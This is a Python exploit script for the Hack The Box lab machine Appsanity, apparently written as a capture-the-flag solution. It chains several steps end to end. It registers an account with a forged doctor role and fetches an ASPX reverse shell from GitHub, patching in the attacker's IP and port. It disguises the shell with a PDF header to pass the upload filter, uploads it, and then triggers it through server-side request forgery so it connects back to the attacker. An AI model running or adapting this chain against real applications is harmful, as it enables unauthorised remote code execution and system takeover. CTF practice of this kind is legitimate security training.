#!/usr/bin/env python3

'''
HTB Appsanity
-------------
Description: SSRF + ASPX File upload
Author: Marss
Repository: https://github.com/E1P0TR0
Date: 13 Nov, 2023
'''

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from random import choices
from re import findall
from requests import get, Session
from requests.exceptions import ConnectionError, ConnectTimeout, ReadTimeout
from requests.packages import urllib3
from signal import signal, SIGINT
from string import ascii_letters, digits
from sys import argv
from os import remove

# Ctrl + c
signal(SIGINT, lambda signum, frame: exit('\n[!] User aborted.'))

# disable SSL warnings
urllib3.disable_warnings()

class Exploit:

    get_rand = lambda self, group, len: ''.join(choices(group, k=len))

    def __init__(self, args):
        
        self.args = args
        self.target = {
            'base_url':'https://meddigi.htb',
            'portal_url':'https://portal.meddigi.htb'
        }
        self.tmp_user = self.get_rand(ascii_letters, 6)
        self.tmp_pass = self.get_rand(ascii_letters, 4) + self.get_rand(digits, 4)

        self.aspx_shell_repo = 'https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx'
        self.aspx_file = self.get_rand(ascii_letters, 5) + '.aspx'

        # Session
        self.session = Session()
        self.session.verify = False
        # Proxies
        if self.args.proxy:
            protocol = self.args.proxy.split('://')[0]
            host = self.args.proxy.split('://')[1]
            self.proxies = { protocol: host}
            self.session.proxies.update(self.proxies)
    
    def run(self):

        if self.target_response():
            
            self.register()
            self.login()
            self.upload_aspx()
            self.execute_aspx()

    def target_response(self) -> bool:

        try:
            response = self.session.get(self.target['base_url'], timeout=5)

            if response.ok:
                print('\n[+] Target up.')
            
            return response.ok

        except ConnectTimeout:
            exit('\n[!] Verify VPN connection.')
        except ConnectionError:
            exit(f'\n[x] Can\'t resolve {self.target["base_url"]}')

    def get_request_token(self, domain, path) -> str:

        response = self.session.get(
            self.target[domain] + path,
        )
        
        return findall(r'name="__RequestVerificationToken".*value="(.*)"', response.text)[0]

    def register(self):

        post_data = {
            'Name': self.tmp_user,
            'LastName': self.tmp_user,
            'Email': '{0}@{0}.{0}'.format(self.tmp_user),
            'Password': self.tmp_pass,
            'ConfirmPassword': self.tmp_pass,
            'DateOfBirth': '1111-11-11',
            'PhoneNumber': self.get_rand(digits, 10),
            'Country': self.get_rand(ascii_letters, 5),
            'Acctype': 2, # Doctor account
            '__RequestVerificationToken': self.get_request_token('base_url', '/signup')
        }

        self.session.post(
            self.target['base_url'] + '/SignUp/SignUp',
            data=post_data
        )

    def login(self):

        post_data = {
            'Email': '{0}@{0}.{0}'.format(self.tmp_user),
            'Password': self.tmp_pass,
            '__RequestVerificationToken': self.get_request_token('base_url', '/signin')
        }

        self.session.post(
            self.target['base_url'] + '/SignIn/SignIn',
            data=post_data
        )

    def prepare_aspx(self):
        
        with get(self.aspx_shell_repo, verify=False) as aspx:
            aspx_content = aspx.text

            with open(self.aspx_file, 'w') as file:
                aspx_content = aspx_content \
                    .replace('127.0.0.1', self.args.ip) \
                    .replace('1234', self.args.port)

                aspx_content = '%PDF-1.7\n%%EOF\n' + aspx_content 
                
                file.write(aspx_content)
                 
    def upload_aspx(self):

        self.prepare_aspx()
        
        form_data = {
            'PatientNo': self.get_rand(digits, 6),
            'PatientName': self.tmp_user,
            'ExamType': self.tmp_user,
            'PhoneNumber': self.get_rand(digits, 10),
            'Department': self.tmp_user,
            'VisitDate': '1111-11-11',
            '__RequestVerificationToken': self.get_request_token('portal_url', '/ExamReport')
        }
        file_data = {
            'ReportFile': (
                self.aspx_file,
                open(self.aspx_file),
                'text/html'
            )
        }

        response = self.session.post(
            self.target['portal_url'] + '/ExamReport/Upload',
            data=form_data,
            files=file_data
        )

    def execute_aspx(self):

        post_data = {
            'Email': '{0}@{0}.{0}'.format(self.tmp_user),
            'Link': 'http://127.0.0.1:8080/'
        }

        response = self.session.post(
            self.target['portal_url'] + '/Prescriptions/SendEmail',
            data=post_data
        )
        aspx_path = findall(f"href='(.*{self.aspx_file})'", response.text)[0]

        post_data = {
            'Email': '{0}@{0}.{0}'.format(self.tmp_user),
            'Link': 'http://127.0.0.1:8080/' + aspx_path
        }
        
        print(f'[+] Open the port {self.args.port} to receive the shell.')
        input('[+] Press any key to continue.')
        
        try:
            self.session.post(
                self.target['portal_url'] + '/Prescriptions/SendEmail',
                data=post_data,
                timeout=5
            )
        except ReadTimeout:
            print('[+] Reverse shell executed.')
        finally:
            remove(self.aspx_file)

if __name__ == '__main__':

    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        epilog=f'''Example:
        python3 {argv[0]} -i 10.10.10.10 -p 4444'''
    )

    parser.add_argument('-i',
        dest='ip',
        type=str,
        required=True,
        help='IP to receive shell')
    parser.add_argument('-p',
        dest='port',
        type=str,
        required=True,
        help='PORT to receive shell')
    parser.add_argument('-x',
        '--proxy',
        type=str,
        help='Setup Proxy (Ex: http://127.1:8080)')
    
    args = parser.parse_args()

    print('|HTB Appsanity (SSRF + ASPX File upload)|')

    exploit = Exploit(args)
    exploit.run()